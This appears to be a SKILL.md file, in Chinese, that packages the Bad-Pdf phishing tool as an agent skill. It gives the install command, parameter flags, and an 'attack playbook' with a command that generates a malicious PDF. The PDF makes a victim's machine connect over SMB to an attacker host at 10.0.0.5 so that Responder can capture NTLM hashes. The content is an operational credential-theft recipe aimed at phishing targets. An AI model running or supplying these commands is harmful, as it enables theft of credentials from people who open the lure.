---
name: bad-pdf-phish
description: 渗透工具 skill:Bad-Pdf 的安装、参数速查与攻击场景 playbook。当任务涉及 钓鱼与社会工程 需要调用 Bad-Pdf 时使用。
---

# Bad-Pdf

- 攻击大类:C08 钓鱼与社会工程
- 上游仓库:https://github.com/deepzec/Bad-Pdf
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/deepzec/Bad-Pdf
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python badpdf.py -n invoice -p 445 -l 10.0.0.5` | 恶意 PDF 生成 |
| `-n name -l lhost -p port` | 参数 |
| `-g` | GUI |

## 攻击场景 Playbook

### PDF NTLM 哈希窃取

```bash
python badpdf.py -n contract -l 10.0.0.5 -p 445
# 目标打开 PDF 即连 SMB,Responder 收哈希
```

## 注意事项

PDF 钓鱼载荷生成器。
